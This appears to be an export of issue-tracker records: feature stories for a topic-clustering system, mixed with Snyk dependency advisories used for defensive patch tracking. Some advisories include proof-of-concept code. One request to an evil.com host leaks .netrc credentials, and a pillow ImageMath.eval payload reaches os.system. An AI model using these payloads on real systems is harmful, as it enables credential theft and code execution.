A monotonic `cluster_version` string (timestamp-based) is returned to track which clustering run produced these assignments.

## Key Files

- Create: `plexus/analysis/topic_clusterer.py`
- Create: `plexus/analysis/topic_clusterer_test.py`

## Dependencies

Story plx-3bb9ce (Batch embedding) — for embedding format.
issues.title: Cluster from pre-computed embeddings

Feature: Memory weight calculation

  Scenario: New cluster starts with baseline weight
    Given a cluster that appears for the first time
    When initial_weight() is computed
    Then memory_weight = 0.5
    And memory_tier = "warm"

  Scenario: Reinforced cluster weight increases
    Given a cluster with current weight 0.5
    And it received 20 new documents in this run
    When reinforce(weight=0.5, new_docs=20, rate=0.1) is called
    Then the new weight is greater than 0.5
    And the weight does not exceed 1.0

  Scenario: Decayed cluster weight decreases
    Given a cluster with current weight 0.7
    And it received 0 new documents in this run
    And 14 days have passed since the last reinforcement
    When decay(weight=0.7, days=14, rate=0.05) is called
    Then the new weight is less than 0.7
    And the weight does not go below 0.0

  Scenario: Tier assignment from weight
    Given weight thresholds hot >= 0.7, warm >= 0.3, cold < 0.3
    When tier_from_weight(0.8) is called
    Then tier = "hot"
    When tier_from_weight(0.5) is called
    Then tier = "warm"
    When tier_from_weight(0.1) is called
    Then tier = "cold"

  Scenario: Cold clusters flagged for pruning
    Given a cluster with weight 0.05 and a prune_threshold of 0.1
    When should_prune(weight=0.05, threshold=0.1) is called
    Then it returns True

issues.description:
**As a** topic memory system, **I want** to compute reinforcement and decay on cluster weights, **so that** frequently recurring topics are treated as established while transient ones fade.

Pure logic — no I/O dependencies. Functions:
- `initial_weight()` — returns 0.5 (neutral starting point) for new clusters
- `reinforce(weight, new_docs, rate)` — increases weight toward 1.0 based on document count
- `decay(weight, days_since_last, rate)` — decreases weight toward 0.0 based on time elapsed
- `tier_from_weight(weight, thresholds)` — maps weight to hot/warm/cold tier
- `should_prune(weight, threshold)` — returns True if weight is below prune threshold

Weight is always clamped to [0.0, 1.0].

## Key Files

- Create: `plexus/analysis/memory_weights.py`
- Create: `plexus/analysis/memory_weights_test.py`

## Dependencies

None (pure logic).
issues.title: Memory weight calculation

## Improper Removal of Sensitive Information Before Storage or Transfer

**Severity:** medium
**Package:** urllib3@2.0.7
**File:** `score-processor-lambda/requirements.txt`

**CVSS Score:** 6.0  
**Snyk Priority Score:** 514/1000

### CVEs
- [CVE-2024-37891](https://nvd.nist.gov/vuln/detail/CVE-2024-37891)

**Fix:** Pin `urllib3` to version 1.26.19, 2.2.2 or later.

### Details
## Overview
[urllib3](https://pypi.org/project/urllib3/) is a HTTP library with thread-safe connection pooling, file post, and more.

Affected versions of this package are vulnerable to Improper Removal of Sensitive Information Before Storage or Transfer due to the improper handling of the `Proxy-Authorization` header during cross-origin redirects when `ProxyManager` is not in use. When the conditions below are met, including non-recommended configurations, the contents of this header can be sent in an automatic HTTP redirect.

**Notes:**

To be vulnerable, the application must be doing all of the following:

1) Setting the `Proxy-Authorization` header without using urllib3's built-in proxy support.

2) Not disabling HTTP redirects (e.g. with `redirects=False`)

3) Either not using an HTTPS origin server, or having a proxy or target origin that redirects to a malicious origin.

## Workarounds

1) Using the `Proxy-Authorization` header with urllib3's `ProxyManager`.

2) Disabling HTTP redirects using `redirects=False` when sending requests.

3) Not using the `Proxy-Authorization` header.
## Remediation
Upgrade `urllib3` to version 1.26.19, 2.2.2 or higher.
## References
- [GitHub Commit](https://github.com/urllib3/urllib3/commit/40b6d1605814dd1db0a46e202d6e56f2e4c9a468)
- [GitHub Commit](https://github.com/urllib3/urllib3/commit/accff72ecc2f6cf5a76d9570198a93ac7c90270e)


### Reference
- [Snyk advisory](https://security.snyk.io/vuln/SNYK-PYTHON-URLLIB3-7267250)
issues.title: [Snyk] SNYK-PYTHON-URLLIB3-7267250 in urllib3@2.0.7

issues.description:
## Storage of Sensitive Data in a Mechanism without Access Control

**Severity:** medium
**Package:** scikit-learn@1.0.2
**File:** `score-processor-lambda/requirements.txt`

**CVSS Score:** 5.3  
**Exploit Maturity:** proof-of-concept  
**Snyk Priority Score:** 586/1000

### CVEs
- [CVE-2024-5206](https://nvd.nist.gov/vuln/detail/CVE-2024-5206)

**Fix:** Pin `scikit-learn` to version 1.5.0 or later.

### Details
## Overview
[scikit-learn](https://pypi.org/project/scikit-learn/) is a Python module for machine learning built on top of SciPy and is distributed under the 3-Clause BSD license.

Affected versions of this package are vulnerable to Storage of Sensitive Data in a Mechanism without Access Control due to the unexpected storage of all tokens present in the training data within the `stop_words_` attribute. An attacker can access sensitive information, such as passwords or keys, by exploiting this behavior.
## PoC
Limiting vocabulary is a very common setting hence provided by the library. The expected behaviour is that the object stores the frequent tokens, and discards the rest after the fitting process. In theory and practice, the vectorizer only needs the vocabulary and the rest of the possible tokens will be simply non needed, hence should be discarded.

While the object correctly forms the required vocabulary, it stores the rest of the tokens in the `stop_words_ attribute. Therefore stores the entire unique tokens that have been passed in the fitting operation. Below it's demonstrated this:

```py
# ╰─$ pip freeze | grep pandas
# pandas==2.2.1
import pandas as pd
# ╰─$ pip freeze | grep scikit-learn
# scikit-learn==1.4.1.post1
from sklearn.feature_extraction.text import TfidfVectorizer

if __name__ == '__main__':
    # Fitting the vectorizer will save every token presented
    vectorizer = TfidfVectorizer(
        max_features=2,
        # min_df=2/6  # Same results occur with different ways of limiting the vocabulary
    ).fit(
        pd.Series([
            "hello", "world", "hello", "world", "secretkey", "password123"
        ])
    )
    # Expected storage for frequent tokens
    print(vectorizer.vocabulary_)  # {'hello': 0, 'server': 1}
    # Unexpected data leak
    print(vectorizer.stop_words_)  # {'password123', 'secretkey'}
```

It is demonstrated below that the storage in the stop_words_ attribute is unnecessary. Nullifying the attribute will give the same results:

```py
# ╰─$ pip freeze | grep pandas
# pandas==2.2.1
import pandas as pd
# ╰─$ pip freeze | grep scikit-learn
# scikit-learn==1.4.1.post1
from sklearn.feature_extraction.text import TfidfVectorizer

if __name__ == '__main__':
    # Fitting the vectorizer will save every token presented
    vectorizer = TfidfVectorizer(
        max_features=2,
        # min_df=2/6  # Same results occur with different ways of limiting the vocabulary
    ).fit(
        pd.Series([
            "hello", "world", "hello", "world", "secretkey", "password123"
        ])
    )
    # Expected storage for frequent tokens
    print(vectorizer.vocabulary_)  # {'hello': 0, 'server': 1}
    # Unexpected data leak
    print(vectorizer.stop_words_)  # {'password123', 'secretkey'}

    # Wiping-out the stop_words_ attribute does not change the behaviour
    print(vectorizer.transform(["hello world"]).toarray())  # [[0.70710678 0.70710678]]
    vectorizer.stop_words_ = None
    assert vectorizer.stop_words_ is None
    print(vectorizer.transform(["hello world"]).toarray())  # [[0.70710678 0.70710678]]
```
## Remediation
Upgrade `scikit-learn` to version 1.5.0 or higher.
## References
- [GitHub Commit](https://github.com/scikit-learn/scikit-learn/commit/70ca21f106b603b611da73012c9ade7cd8e438b8)


### Reference
- [Snyk advisory](https://security.snyk.io/vuln/SNYK-PYTHON-SCIKITLEARN-7217830)
issues.title: [Snyk] SNYK-PYTHON-SCIKITLEARN-7217830 in scikit-learn@1.0.2

## Insertion of Sensitive Information Into Sent Data

**Severity:** medium
**Package:** requests@2.31.0
**File:** `plexus/metrics/requirements.txt`

**CVSS Score:** 5.7  
**Exploit Maturity:** proof-of-concept  
**Snyk Priority Score:** 606/1000

### CVEs
- [CVE-2024-47081](https://nvd.nist.gov/vuln/detail/CVE-2024-47081)

**Fix:** Pin `requests` to version 2.32.4 or later.

### Details
## Overview

Affected versions of this package are vulnerable to Insertion of Sensitive Information Into Sent Data due to incorrect URL processing. An attacker could craft a malicious URL that, when processed by the library, tricks it into sending the victim's `.netrc` credentials to a server controlled by the attacker.

**Note:**

This is only exploitable if the `.netrc` file contains an entry for the hostname that the attacker includes in the crafted URL's "intended" part (e.g., `example.com` in `http://example.com:@evil.com/`).
## PoC
```
requests.get('http://example.com:@evil.com/')
```
## Remediation
Upgrade `requests` to version 2.32.4 or higher.
## References

## Prototype Pollution **Severity:** medium **Package:** lodash@4.17.21 **File:** `dashboard/package.json` **CVSS Score:** 6.9 **Snyk Priority Score:** 559/1000 ### CVEs - [CVE-2025-13465](https://nvd.nist.gov/vuln/detail/CVE-2025-13465) **Fix:** Upgrade `lodash` to version 4.17.23 or later. ### Details ## Overview [lodash](https://www.npmjs.com/package/lodash) is a modern JavaScript utility library delivering modularity, performance, & extras. Affected versions of this package are vulnerable to Prototype Pollution via the `_.unset` and `_.omit` functions. An attacker can delete methods held in properties of global prototypes but cannot overwrite those properties. ## Details Prototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values. Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution. There are two main ways in which the pollution of prototypes occurs: - Unsafe `Object` recursive merge - Property definition by path ### Unsafe Object recursive merge The logic of a vulnerable recursive merge function follows the following high-level model: ``` merge (target, source) foreach property of source if property exists and is an object on both the target and the source merge(target[property], source[property]) else target[property] = source[property] ```
When the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype. Clone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`. `lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks. ### Property definition by path There are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)` If the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object. ## Types of attacks There are a few methods by which Prototype Pollution can be manipulated: | Type |Origin |Short description | |--|--|--| | **Denial of service (DoS)**|Client |This is the most likely attack.
DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`).
The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.
**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. | |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.
**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.| |**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.
**For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.| ## Affected environments The following environments are susceptible to a Prototype Pollution attack: - Application server - Web server - Web browser ## How to prevent 1. Freeze the prototype— use `Object.freeze (Object.prototype)`. 2. Require schema validation of JSON input. 3. Avoid using unsafe recursive merge functions. 4. Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution. 5. As a best practice use `Map` instead of `Object`. ### For more information on this vulnerability type: [Arteau, Olivier. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf) ## Remediation Upgrade `lodash` to version 4.17.23 or higher. ## References - [GitHub Commit](https://github.com/lodash/lodash/commit/edadd452146f7e4bad4ea684e955708931d84d81) ### Reference - [Snyk advisory](https://security.snyk.io/vuln/SNYK-JS-LODASH-15053838)
issues.title: [Snyk] SNYK-JS-LODASH-15053838 in lodash@4.17.21

comments.text:
Feature: Index rebuild and clustering orchestration

  Scenario: Full pipeline executes in order
    Given 100 documents with embeddings
    And mocked TopicMemoryIndex and TopicClusterer
    When generate() is awaited
    Then the following calls occur in order:
      1. TopicMemoryIndex.build_index(documents) is called
      2. TopicMemoryIndex.swap_alias(new_index) is called
      3. TopicClusterer.cluster(embeddings, texts) is called
      4. Cluster records are persisted
    And the output contains "cluster_count" greater than 0

  Scenario: Clustering results appear in the output
    Given TopicClusterer returns 5 clusters with labels
    When generate() completes
    Then the output "topics" list has 5 entries
    And each entry has keys: cluster_id, label, member_count, memory_weight, memory_tier

  Scenario: OpenSearch connection failure does not crash the block
    Given TopicMemoryIndex.health_check() returns False
    When generate() is awaited
    Then the output contains an error about OpenSearch connectivity
    And the block returns gracefully with error status

issues.description:
**As a** VectorTopicMemory block, **I want** to rebuild the OpenSearch index and run global clustering after embeddings are computed, **so that** topic buckets are recomputed from the full dataset.

After embeddings are produced (Story 7.1), `generate()` calls:
1. `TopicMemoryIndex.build_index(documents)` — bulk-index all documents with embeddings
2. `TopicMemoryIndex.swap_alias(new_index)` — atomic blue/green swap
3. `TopicClusterer.cluster(embeddings, texts)` — run UMAP + HDBSCAN on pre-computed embeddings
4. `TopicMemoryIndex.persist_clusters(clusters)` — store cluster records

OpenSearch connection failures must be handled gracefully, returning an error status in the output rather than crashing the block.

## Key Files

- Modify: `plexus/reports/blocks/vector_topic_memory.py`
- Modify: `plexus/reports/blocks/vector_topic_memory_test.py`

## Dependencies

- Story plx-b02d58 (Bulk index with blue/green alias swap)
- Story plx-941008 (Cluster from pre-computed embeddings)
- Story plx-5244af (Cluster record persistence)
issues.title: Index rebuild and clustering orchestration

## Improper Handling of Highly Compressed Data (Data Amplification)

**Severity:** high
**Package:** urllib3@2.0.7
**File:** `score-processor-lambda/requirements.txt`

**CVSS Score:** 8.9  
**Snyk Priority Score:** 659/1000

### CVEs
- [CVE-2026-21441](https://nvd.nist.gov/vuln/detail/CVE-2026-21441)

**Fix:** Pin `urllib3` to version 2.6.3 or later.

### Details
## Overview
[urllib3](https://pypi.org/project/urllib3/) is a HTTP library with thread-safe connection pooling, file post, and more.

Affected versions of this package are vulnerable to Improper Handling of Highly Compressed Data (Data Amplification) via the streaming API when handling HTTP redirects. An attacker can cause excessive resource consumption by serving a specially crafted compressed response that triggers decompression of large amounts of data before any read limits are enforced.

**Note:**
This is only exploitable if content is streamed from untrusted sources with redirects enabled.

## Workaround 
This vulnerability can be mitigated by disabling redirects by setting `redirect=False` for requests to untrusted sources.
## Remediation
Upgrade `urllib3` to version 2.6.3 or higher.
## References
- [GitHub Commit](https://github.com/urllib3/urllib3/commit/8864ac407bba8607950025e0979c4c69bc7abc7b)


### Reference
- [Snyk advisory](https://security.snyk.io/vuln/SNYK-PYTHON-URLLIB3-14896210)

## Allocation of Resources Without Limits or Throttling

**Severity:** high
**Package:** urllib3@1.26.20
**File:** `dashboard/amplify/functions/taskDispatcher/requirements.txt`

**CVSS Score:** 8.9  
**Snyk Priority Score:** 659/1000

### CVEs
- [CVE-2025-66418](https://nvd.nist.gov/vuln/detail/CVE-2025-66418)

**Fix:** Pin `urllib3` to version 2.6.0 or later.

### Details
## Overview
[urllib3](https://pypi.org/project/urllib3/) is a HTTP library with thread-safe connection pooling, file post, and more.

Affected versions of this package are vulnerable to Allocation of Resources Without Limits or Throttling during the decompression of compressed response data. An attacker can cause excessive CPU and memory consumption by sending responses with a large number of chained compression steps.

## Workaround
This vulnerability can be avoided by setting `preload_content=False` and ensuring that `resp.headers["content-encoding"]` are limited to a safe quantity before reading.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](https://security.snyk.io/vuln/SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `urllib3` to version 2.6.0 or higher.
## References
- [GitHub Commit](https://github.com/urllib3/urllib3/commit/24d7b67eac89f94e11003424bcf0d8f7b72222a8)


### Reference
- [Snyk advisory](https://security.snyk.io/vuln/SNYK-PYTHON-URLLIB3-14192443)
issues.title: [Snyk] SNYK-PYTHON-URLLIB3-14192443 in urllib3@1.26.20

issues.description:
Perform full re-clustering over all indexed documents, producing stable cluster assignments with centroids, boundary distances, and LLM-generated labels. Reuses BERTopic patterns from `plexus/analysis/topics/analyzer.py` but operates on **pre-computed embeddings** rather than raw text.

The key architectural change from existing `TopicAnalysis` is decoupling: the `TopicClusterer` receives embeddings that were already computed (and cached) by Epic 2, then runs only UMAP + HDBSCAN + c-TF-IDF.

## Definition of Done

- `TopicClusterer` class in `plexus/analysis/topic_clusterer.py`
- Clusters from pre-computed 384-dim embeddings via BERTopic
- Computes centroids (mean of member embeddings) per cluster
- Computes p95 distance boundaries per cluster
- Generates human-readable labels via LLM (mocked in tests)
- Cluster records persisted to OpenSearch as special documents with `record_type: cluster`
- All scenarios in child stories pass

## Depends On

- Epic plx-46f6f0 (Embedding Cache) — for embedding format
- Epic plx-493fd8 (OpenSearch Client) — for persistence

## Key Files

- Create: `plexus/analysis/topic_clusterer.py`
- Create: `plexus/analysis/topic_clusterer_test.py`
- Modify: `plexus/analysis/opensearch_client.py` (cluster record methods)
- Reuse patterns from: `plexus/analysis/topics/analyzer.py` (UMAP lines 524-534, BERTopic lines 738-746)

## HTTP Request Smuggling

**Severity:** critical
**Package:** h11@0.14.0
**File:** `score-processor-lambda/requirements.txt`

**CVSS Score:** 9.3  
**Snyk Priority Score:** 679/1000

### CVEs
- [CVE-2025-43859](https://nvd.nist.gov/vuln/detail/CVE-2025-43859)

**Fix:** Pin `h11` to version 0.16.0 or later.

### Details
## Overview
[h11](https://pypi.org/project/h11) is an A pure-Python, bring-your-own-I/O implementation of HTTP/1.1

Affected versions of this package are vulnerable to HTTP Request Smuggling via the class `ChunkedReader` in `_readers.py` file, which performs the parsing of line terminators in chunked-coding message bodies. An attacker can exploit this to bypass security controls and smuggle HTTP requests by crafting malformed chunked-encoding bodies.
## Remediation
Upgrade `h11` to version 0.16.0 or higher.
## References
- [GitHub Commit](https://github.com/python-hyper/h11/commit/dff7cc397a26ed4acdedd92d1bda6c8f18a6ed9f)

## Eval Injection

**Severity:** high
**Package:** pillow@9.5.0
**File:** `score-processor-lambda/requirements.txt`

**CVSS Score:** 8.1  
**Exploit Maturity:** proof-of-concept  
**Snyk Priority Score:** 726/1000

### CVEs
- [CVE-2023-50447](https://nvd.nist.gov/vuln/detail/CVE-2023-50447)

**Fix:** Pin `pillow` to version 10.2.0 or later.

### Details
## Overview

Affected versions of this package are vulnerable to Eval Injection via the `PIL.ImageMath.eval` function when an attacker has control over the keys passed to the `environment` argument.
## PoC
```python
from PIL import Image, ImageMath

image1 = Image.open('__class__')
image2 = Image.open('__bases__')
image3 = Image.open('__subclasses__')
image4 = Image.open('load_module')
image5 = Image.open('system')

expression = "().__class__.__bases__[0].__subclasses__()[104].load_module('os').system('whoami')"

environment = {
    image1.filename: image1,
    image2.filename: image2,
    image3.filename: image3,
    image4.filename: image4,
    image5.filename: image5
}

ImageMath.eval(expression, **environment)
```
## Remediation
Upgrade `pillow` to version 10.2.0 or higher.
## References
- [GitHub Commit](https://github.com/python-pillow/Pillow/commit/02c6183d41c68a8dd080f5739f566bd82485822d)
- [GitHub Release](https://github.com/python-pillow/Pillow/releases/tag/10.2.0)
- [Security Advisory](https://duartecsantos.github.io/2023-01-02-CVE-2023-50447/)


### Reference
- [Snyk advisory](https://security.snyk.io/vuln/SNYK-PYTHON-PILLOW-6182918)

## Open Redirect

**Severity:** medium
**Package:** urllib3@1.26.20
**File:** `dashboard/amplify/functions/taskDispatcher/requirements.txt`

**CVSS Score:** 6.0  
**Snyk Priority Score:** 514/1000

### CVEs
- [CVE-2025-50181](https://nvd.nist.gov/vuln/detail/CVE-2025-50181)

**Fix:** Pin `urllib3` to version 2.5.0 or later.

### Details
## Overview
[urllib3](https://pypi.org/project/urllib3/) is a HTTP library with thread-safe connection pooling, file post, and more.

Affected versions of this package are vulnerable to Open Redirect due to the `retries` parameter being ignored during `PoolManager` instantiation. An attacker can access unintended resources or endpoints by leveraging automatic redirects when the application expects redirects to be disabled at the connection pool level.

**Note:**

`requests` and `botocore` users are not affected.

## Workaround

This can be mitigated by disabling redirects at the `request()` level instead of the `PoolManager()` level.
## Remediation
Upgrade `urllib3` to version 2.5.0 or higher.
## References
- [GitHub Commit](https://github.com/urllib3/urllib3/commit/f05b1329126d5be6de501f9d1e3e36738bc08857)


### Reference
- [Snyk advisory](https://security.snyk.io/vuln/SNYK-PYTHON-URLLIB3-10390194)
issues.title: [Snyk] SNYK-PYTHON-URLLIB3-10390194 in urllib3@1.26.20

comments.text:
Feature: Bulk index with blue/green alias swap

  Scenario: Documents indexed via bulk API
    Given a TopicMemoryIndex with a mocked opensearch-py client
    And 100 documents each with doc_id, text, embedding (384-dim), and metadata
    When build_index(documents) is called
    Then a new index is created with a name matching "topic-memory-YYYYMMDD-HHMMSS"
    And the bulk API is called with 100 documents
    And no errors are returned

  Scenario: Atomic alias swap
    Given a mocked client where "topic-memory-live" currently points to "topic-memory-old"
    And a new index "topic-memory-20260303" has been successfully populated
    When swap_alias(new_index_name) is called
    Then a single indices.update_aliases call is made with actions:
      remove alias "topic-memory-live" from "topic-memory-old"
      add alias "topic-memory-live" to "topic-memory-20260303"

  Scenario: Old index is deleted after successful swap
    Given a successful alias swap from "topic-memory-old" to "topic-memory-new"
    When the swap completes
    Then indices.delete is called for "topic-memory-old"

  Scenario: Partial bulk failures are reported
    Given 100 documents where 2 have malformed embeddings
    When build_index(documents) is called
    Then the result has success_count=98 and error_count=2
    And the failed doc_ids are logged

issues.description:
**As a** ReportBlock, **I want** to bulk-index documents into a new timestamped index and atomically swap the live alias, **so that** re-indexing is safe, repeatable, and zero-downtime.

The client creates a new timestamped index (e.g., `topic-memory-20260303-143022`), bulk-indexes all documents, then atomically swaps the `topic-memory-live` alias from the old index to the new one using a single `update_aliases` call. After a successful swap, the old index is deleted.

Partial bulk failures (e.g., malformed embeddings) must be tracked: the method returns success/error counts and logs failed doc_ids rather than aborting the entire batch.

## Key Files

- Modify: `plexus/analysis/opensearch_client.py`
- Modify: `plexus/analysis/opensearch_client_test.py`

## Dependencies

Story plx-c14147 (Client connection and health check)
issues.title: Bulk index with blue/green alias swap

### Details
## NVD Description
**_Note:_** _Versions mentioned in the description apply only to the upstream `glibc` package and not the `glibc` package as distributed by `Debian`._
_See `How to fix?` for `Debian:13` relevant fixed versions and status._

GNU Libc current is affected by: Re-mapping current loaded library with malicious ELF file. The impact is: In worst case attacker may evaluate privileges. The component is: libld. The attack vector is: Attacker sends 2 ELF files to victim and asks to run ldd on it. ldd execute code. NOTE: Upstream comments indicate "this is being treated as a non-security bug and no real threat.
## Remediation

## Insertion of Sensitive Information Into Sent Data

**Severity:** medium
**Package:** requests@2.31.0
**File:** `infrastructure/lambda_functions/metrics_aggregator/requirements.txt`

**CVSS Score:** 5.7  
**Exploit Maturity:** proof-of-concept  
**Snyk Priority Score:** 606/1000

### CVEs
- [CVE-2024-47081](https://nvd.nist.gov/vuln/detail/CVE-2024-47081)

**Fix:** Pin `requests` to version 2.32.4 or later.

### Details
## Overview

Affected versions of this package are vulnerable to Insertion of Sensitive Information Into Sent Data due to incorrect URL processing. An attacker could craft a malicious URL that, when processed by the library, tricks it into sending the victim's `.netrc` credentials to a server controlled by the attacker.

**Note:**

This is only exploitable if the `.netrc` file contains an entry for the hostname that the attacker includes in the crafted URL's "intended" part (e.g., `example.com` in `http://example.com:@evil.com/`).
## PoC
```
requests.get('http://example.com:@evil.com/')
```
## Remediation
Upgrade `requests` to version 2.32.4 or higher.
## References
- [GitHub Commit](https://github.com/psf/requests/commit/5b4b64c3467fd7a3c03f91ee641aaa348b6bed3b)
- [GitHub Commit](https://github.com/psf/requests/commit/7bc45877a86192af77645e156eb3744f95b47dae)

## Improper Handling of Highly Compressed Data (Data Amplification)

**Severity:** high
**Package:** urllib3@2.0.7
**File:** `plexus/metrics/requirements.txt`

**CVSS Score:** 8.9  
**Snyk Priority Score:** 659/1000

### CVEs
- [CVE-2025-66471](https://nvd.nist.gov/vuln/detail/CVE-2025-66471)

**Fix:** Pin `urllib3` to version 2.6.0 or later.

### Details
## Overview
[urllib3](https://pypi.org/project/urllib3/) is a HTTP library with thread-safe connection pooling, file post, and more.

Affected versions of this package are vulnerable to Improper Handling of Highly Compressed Data (Data Amplification) in the Streaming API. The `ContentDecoder` class can be forced to allocate disproportionate resources when processing a single chunk with very high compression, such as via the `stream()`, `read(amt=256)`, `read1(amt=256)`, `read_chunked(amt=256)`, and `readinto(b)` functions.

**Note:** It is recommended to patch Brotli dependencies (upgrade to at least 1.2.0) if they are installed outside of `urllib3` as well, to avoid other instances of the same vulnerability.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](https://security.snyk.io/vuln/SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `urllib3` to version 2.6.0 or higher.
## References
- [GitHub Commit](https://github.com/urllib3/urllib3/commit/c19571de34c47de3a766541b041637ba5f716ed7)


### Reference
- [Snyk advisory](https://security.snyk.io/vuln/SNYK-PYTHON-URLLIB3-14192442)
issues.title: [Snyk] SNYK-PYTHON-URLLIB3-14192442 in urllib3@2.0.7

Feature: VectorTopicMemory block registration and instantiation

  Scenario: VectorTopicMemory appears in the block class registry
    Given the plexus.reports.blocks module has been imported
    When the BLOCK_CLASSES dictionary is inspected in plexus/reports/service.py
    Then it contains a key "VectorTopicMemory"
    And the value is a class that is a subclass of BaseReportBlock

  Scenario: VectorTopicMemory is instantiated from valid config
    Given a config dict with embedding, opensearch, and clustering sections
    And a mock PlexusDashboardClient
    When VectorTopicMemory(config, params, api_client) is called
    Then the instance has config, params, and api_client set correctly
    And DEFAULT_NAME equals "Vector Topic Memory"

  Scenario: VectorTopicMemory handles None params
    Given a config dict and params is None
    When VectorTopicMemory(config, None, api_client) is called
    Then self.params is an empty dictionary

issues.description:
**As a** report system consumer, **I want** to declare a `VectorTopicMemory` block in my report configuration, **so that** the report service discovers and instantiates it like any other block.

The report service in `plexus/reports/service.py` discovers block classes via reflection on the `plexus/reports/blocks/__init__.py` module. A new `VectorTopicMemory` class must extend `BaseReportBlock`, be imported in `__init__.py`, and appear in the `BLOCK_CLASSES` registry.

## Key Files

- Create: `plexus/reports/blocks/vector_topic_memory.py`
- Create: `plexus/reports/blocks/vector_topic_memory_test.py`
- Modify: `plexus/reports/blocks/__init__.py` (add import + `__all__` entry)

## Dependencies

None. First story in the initiative.
issues.title: Block registration and instantiation
